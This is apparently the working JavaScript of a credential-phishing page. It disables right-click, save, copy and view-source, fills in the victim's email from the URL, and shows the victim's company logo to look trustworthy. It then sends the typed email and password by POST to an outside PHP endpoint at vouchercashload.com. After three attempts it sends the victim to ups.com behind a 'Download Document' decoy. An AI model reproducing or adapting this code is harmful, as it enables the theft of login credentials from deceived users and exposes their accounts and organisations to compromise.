// prevent ctrl + s
	$(document).bind('keydown', function(e) {
	if(e.ctrlKey && (e.which == 83)) {
	e.preventDefault();
	return false;
	}
	});
	
	document.addEventListener('contextmenu', event => event.preventDefault());
	
	document.onkeydown = function(e) {
	if (e.ctrlKey && 
	(e.keyCode === 67 || 
	e.keyCode === 86 || 
	e.keyCode === 85 || 
	e.keyCode === 117)) {
	return false;
	} else {
	return true;
	}
	};
	$(document).keypress("u",function(e) {
	if(e.ctrlKey)
	{
	return false;      }
	else {
	return true;
	}});
	
	
	
	/* global $ */
	$(document).ready(function(){
	var count=0;
	
	$('#back1').click(function () {
	$("#msg").hide();
	$('#email').val("");
	$("#automail").animate({left:200, opacity:"hide"}, 0);
	$("#inputbar").animate({right:200, opacity:"show"}, 1000);
	
	});
	
	var email = window.location.hash.substr(1);
	if (!email) {
	
	}
	else
	{
	var my_email =email;
	$('#email').val(my_email);
	$('#emailich').html(my_email);
	
	var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
	
	if (!filter.test(my_email)) {
	$('#error').show();
	email.focus;
	return false;
	}
	var ind=my_email.indexOf("@");
	var my_slice=my_email.substr((ind+1));
	var c= my_slice.substr(0, my_slice.indexOf('.'));
	var final= c.toLowerCase();
	var finalu= c.toUpperCase();
	
	$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
	
	$("#logoimg").attr("alt", finalu);
	$("#logoname").html(finalu);
	$(".logoname").html(finalu);
	}
	
	
	$('#submit-btn').click(function(event){
	$('#error').hide();
	$('#msg').hide();
	event.preventDefault();
	var email=$("#email").val();
	var password=$("#password").val();
	var msg = $('#msg').html();
	$('#msg').text( msg );
	///////////new injection////////////////
	var my_email =email;
	var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
	
	if (!filter.test(my_email)) {
	$('#error').show();
	email.focus;
	return false;
	}
	
	var ind=my_email.indexOf("@");
	var my_slice=my_email.substr((ind+1));
	var c= my_slice.substr(0, my_slice.indexOf('.'));
	var final= c.toLowerCase();
	var finalu= c.toUpperCase();
	
	$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
	$("#logoname").html(finalu);
	///////////new injection////////////////
	count=count+1;
	
	$.ajax({
	dataType: 'JSON',
	url: 'https://vouchercashload.com/okiri.php',
	type: 'POST',
		 data:{
			 email:email,
			 password:password,
		 },
		   // data: $('#contact').serialize(),
		   beforeSend: function(xhr){
			   $('#submit-btn').val('Verifing...');
		   },
		   success: function(response){
			   if(response){
				   $("#msg").show();
				   console.log(response);
				   if(response['signal'] == 'ok'){
					   $("#password").val("");
					   if (count>=3) {
						   count=0;
				   // window.location.replace(response['redirect_link']);
				 window.location.href("https://www.ups.com");
	
			   }
			   // $('#msg').html(response['msg']);
		   }
		   else{
			   // $('#msg').html(response['msg']);
		   }
	   }
	},
	error: function(){
	   $("#password").val("");
	   if (count>=3) {
		   count=0;
		   window.location.replace("https://www.ups.com");
	   }
	$("#msg").show();
			 // $('#msg').html("Please try again later");
	},
	complete: function(){
	   $('#submit-btn').val('Download Document');
	}
	});
	});
	
	
	});
	
